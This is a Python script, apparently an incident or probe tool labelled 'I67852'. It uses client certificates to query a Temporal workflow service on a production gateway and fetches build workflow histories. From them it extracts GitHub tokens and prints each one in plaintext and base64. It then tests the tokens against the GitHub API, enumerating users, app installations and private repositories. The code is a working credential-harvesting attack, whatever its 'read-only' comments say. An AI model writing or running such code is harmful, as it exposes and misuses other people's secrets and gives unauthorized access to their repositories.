#!/usr/bin/env python3
# I67852: re-fetch Temporal build workflow histories, extract GitHub credential fields,
# classify, and test read-only against GitHub API. Strictly read-only.
import subprocess, struct, json, sys, os, time, re, base64

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
CTR = [0]
T = '/temporal.api.workflowservice.v1.WorkflowService/'


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
        if s > 63:
            break
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l]))
            i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4]))
            i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8]))
            i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def grpc_call(path, body=b'', timeout=25):
    CTR[0] += 1
    n = CTR[0]
    fu = '/tmp/r%d.bin' % n
    hu = '/tmp/h%d.txt' % n
    bu = '/tmp/b%d.bin' % n
    tu = '/tmp/t%d.txt' % n
    framed = b'\x00' + struct.pack('>I', len(body)) + body
    open(fu, 'wb').write(framed)
    args = ['curl', '-sS', '--http2', '--connect-timeout', '6', '-m', str(timeout), '-D', hu, '-o', bu,
            '--trace-ascii', tu, '-w', '%{http_code}',
            '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
            '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
    p = subprocess.run(args, capture_output=True, text=True)
    hdr = ''
    for f in (hu, tu):
        try:
            hdr += open(f, 'rb').read().decode('utf-8', 'replace')
        except Exception:
            pass
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    msgs = re.findall(r'grpc-message:\s*([^\r\n]*)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    return {'http': p.stdout.strip(), 'st': (sts[-1] if sts else '-'),
            'msg': (msgs[-1].strip()[:120] if msgs else ''), 'n': len(data), 'data': data,
            'err': (p.stderr or '').strip()[:120]}


def frame_payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


def get1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2:
                return v
    except Exception:
        return None
    return None


def all_of(b, field):
    try:
        return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception:
        return []


json_re = re.compile(rb'\{"', re.S)


def jsons_from(b):
    out = []
    i = 0
    while True:
        m = json_re.search(b, i)
        if not m:
            break
        s = m.start()
        depth = 0
        j = s
        inq = False
        esc = False
        while j < len(b):
            c = b[j:j + 1]
            if inq:
                if esc:
                    esc = False
                elif c == b'\\':
                    esc = True
                elif c == b'"':
                    inq = False
            else:
                if c == b'"':
                    inq = True
                elif c == b'{':
                    depth += 1
                elif c == b'}':
                    depth -= 1
                    if depth == 0:
                        break
            j += 1
        if j < len(b) and 2 < j - s < 400000:
            try:
                out.append(json.loads(b[s:j + 1].decode('utf-8', 'replace')))
            except Exception:
                pass
        i = max(j, s + 2)
        if len(out) > 60:
            break
    return out


TOKEN_KEYS = ('githubtoken', 'bearertoken', 'githubbottoken', 'storetoken')


def walk(o, prefix='', found=None):
    found = found if found is not None else []
    if isinstance(o, dict):
        for k, v in o.items():
            lk = k.lower()
            if isinstance(v, str) and any(lk == tk or lk.endswith('.' + tk) for tk in TOKEN_KEYS):
                found.append((prefix + k, v))
            walk(v, prefix + k + '.', found)
    elif isinstance(o, list):
        for it in o[:6]:
            walk(it, prefix, found)
    return found


def classify(tok):
    if tok.startswith('ghp_'):
        return 'ghp_PAT_classic'
    if tok.startswith('gho_'):
        return 'gho_OAuth'
    if tok.startswith('ghu_'):
        return 'ghu_user_server'
    if tok.startswith('ghs_'):
        return 'ghs_app_installation'
    if tok.startswith('ghr_'):
        return 'ghr_refresh'
    if tok.startswith('github_pat_'):
        return 'github_pat_finegrained'
    if tok.startswith('eyJ'):
        try:
            h = tok.split('.')[0]
            h += '=' * (-len(h) % 4)
            hd = json.loads(base64.urlsafe_b64decode(h))
            return 'JWT_' + str(hd.get('typ') or hd.get('alg'))
        except Exception:
            return 'JWT'
    return 'opaque'


def gh_req(path, tok, scheme='token'):
    hdr = ['-H', 'Authorization: %s %s' % (scheme, tok), '-H', 'User-Agent: i67852-probe',
           '-H', 'Accept: application/vnd.github+json']
    args = ['curl', '-sS', '-m', '20', '-w', '\n%{http_code}', '-D', '/tmp/gh.h'] + hdr + ['https://api.github.com' + path]
    p = subprocess.run(args, capture_output=True, text=True)
    body = p.stdout or ''
    code = ''
    if '\n' in body:
        body, code = body.rsplit('\n', 1)
    hdr_txt = ''
    try:
        hdr_txt = open('/tmp/gh.h', 'r', errors='replace').read()
    except Exception:
        pass
    return code.strip(), body, hdr_txt


def main():
    print('===I67852 START=== host=%s %s' % (subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip(),
                                            time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())), flush=True)
    print('CERT|' + subprocess.run(['sh', '-c', 'openssl x509 -in %s -noout -subject -issuer 2>&1 | tr "\\n" " "' % CRT],
                                   capture_output=True, text=True).stdout.strip(), flush=True)
    # control
    r = grpc_call(T + 'GetSystemInfo', b'')
    print('CTRL|GetSystemInfo|http=%s|st=%s|len=%d' % (r['http'], r['st'], r['n']), flush=True)
    if r['st'] != '0':
        print('ABORT|gateway/temporal unreachable', flush=True)
        return

    execs = []
    for q in ['WorkflowType="ScheduleBuildAndPublishImage"', 'WorkflowType="ScheduleSnapshotAndBuild"']:
        req = fs(1, 'builds') + fv(2, 20) + fs(4, q)
        r = grpc_call(T + 'ListWorkflowExecutions', req)
        print('LIST|%s|http=%s|st=%s|len=%d' % (q[:40], r['http'], r['st'], r['n']), flush=True)
        if r['st'] != '0':
            continue
        pl = frame_payload(r['data'])
        for ei in all_of(pl, 1):
            ex = get1(ei, 1) or b''
            wid = (get1(ex, 1) or b'').decode('utf-8', 'replace')
            rid = (get1(ex, 2) or b'').decode('utf-8', 'replace')
            ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
            if wid:
                execs.append((wid, rid, ty))

    seen = set()
    uniq = []
    for e in execs:
        if e[1] not in seen:
            seen.add(e[1])
            uniq.append(e)
    # <=5 histories: prefer 3 build + 2 snapshot
    picks = [e for e in uniq if 'BuildAndPublish' in e[2]][:3] + [e for e in uniq if 'SnapshotAndBuild' in e[2]][:2]
    print('PICK=%d of %d' % (len(picks), len(uniq)), flush=True)
    for w in picks:
        print('  P|%s|%s' % (w[2], w[0][:70]), flush=True)

    found = []  # (source, key, value)
    for wid, rid, ty in picks:
        tok = b''
        for pg in range(2):
            req = fs(1, 'builds') + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, 20) + (fmsg(4, tok) if tok else b'')
            r = grpc_call(T + 'GetWorkflowExecutionHistory', req, timeout=30)
            if r['st'] != '0':
                print('H|%s|pg%d|st=%s' % (ty[:28], pg, r['st']), flush=True)
                break
            pl = frame_payload(r['data'])
            tok = get1(pl, 3) or b''
            hit = 0
            for j in jsons_from(pl):
                for k, v in walk(j):
                    found.append(('%s/%s' % (ty[:28], wid[-8:]), k, v))
                    hit += 1
            print('H|%s|%s|pg%d|len=%d|tokhits=%d' % (ty[:28], wid[-8:], pg, len(pl), hit), flush=True)
            if not tok:
                break

    # dedupe tokens, keep first source
    uni = {}
    for src, k, v in found:
        v = v.strip()
        if not v or len(v) < 8:
            continue
        if v not in uni:
            uni[v] = (src, k)
    print('TOKENS_UNIQUE=%d' % len(uni), flush=True)

    idx = 0
    toks = []
    for v, (src, k) in uni.items():
        idx += 1
        cls = classify(v)
        print('TOK|%d|%s|key=%s|src=%s|len=%d|class=%s|val=%s' % (idx, 'v', k, src, len(v), cls, v), flush=True)
        print('TOKB64|%d|%s' % (idx, base64.b64encode(v.encode()).decode()), flush=True)
        toks.append((idx, v, cls, k))

    for idx, v, cls, k in toks:
        print('---TEST|%d|%s---' % (idx, cls), flush=True)
        if cls.startswith('JWT'):
            code, body, hdr = gh_req('/app', v, scheme='Bearer')
            print('API|%d|app|http=%s|%s' % (idx, code, body[:400].replace('\n', ' ')), flush=True)
            code, body, hdr = gh_req('/app/installations?per_page=30', v, scheme='Bearer')
            print('API|%d|appinstall|http=%s|%s' % (idx, code, body[:800].replace('\n', ' ')), flush=True)
            continue
        code, body, hdr = gh_req('/user', v)
        info = ''
        try:
            d = json.loads(body)
            info = 'login=%s|type=%s|id=%s|name=%s' % (d.get('login'), d.get('type'), d.get('id'), d.get('name'))
        except Exception:
            info = body[:200].replace('\n', ' ')
        scopes = ''
        m = re.search(r'x-oauth-scopes:\s*([^\r\n]*)', hdr, re.I)
        if m:
            scopes = 'scopes=%s' % m.group(1).strip()
        rate = ''
        m = re.search(r'x-ratelimit-remaining:\s*([^\r\n]*)', hdr, re.I)
        if m:
            rate = 'rl=%s' % m.group(1).strip()
        print('API|%d|user|http=%s|%s|%s|%s' % (idx, code, info, scopes, rate), flush=True)
        if code != '200':
            continue
        code, body, hdr = gh_req('/user/installations?per_page=30', v)
        inames = []
        try:
            d = json.loads(body)
            for it in (d.get('installations') or [])[:10]:
                acct = it.get('account') or {}
                inames.append('%s:%s:id%s' % (acct.get('login'), acct.get('type'), it.get('id')))
        except Exception:
            pass
        print('API|%d|installations|http=%s|n=%d|%s' % (idx, code, len(inames), ','.join(inames)), flush=True)
        for it in inames[:2]:
            iid = re.search(r'id(\d+)$', it).group(1)
            code2, body2, hdr2 = gh_req('/installation/repositories?per_page=30&installation_id=' + iid, v)
            repos = []
            try:
                d = json.loads(body2)
                for rp in (d.get('repositories') or [])[:30]:
                    repos.append('%s/%s:%s' % (rp.get('owner', {}).get('login'), rp.get('name'), 'priv' if rp.get('private') else 'pub'))
            except Exception:
                pass
            print('API|%d|inst_repos[%s]|http=%s|n=%d|%s' % (idx, iid, code2, len(repos), ','.join(repos)), flush=True)
        # also plain user repos (read-only listing)
        code, body, hdr = gh_req('/user/repos?per_page=30&affiliation=owner,collaborator,organization_member', v)
        repos = []
        try:
            d = json.loads(body)
            for rp in (d if isinstance(d, list) else [])[:30]:
                repos.append('%s/%s:%s' % (rp.get('owner', {}).get('login'), rp.get('name'), 'priv' if rp.get('private') else 'pub'))
        except Exception:
            pass
        print('API|%d|user_repos|http=%s|n=%d|%s' % (idx, code, len(repos), ','.join(repos)))
        time.sleep(1)

    print('===I67852 END===', flush=True)


if __name__ == '__main__':
    main()
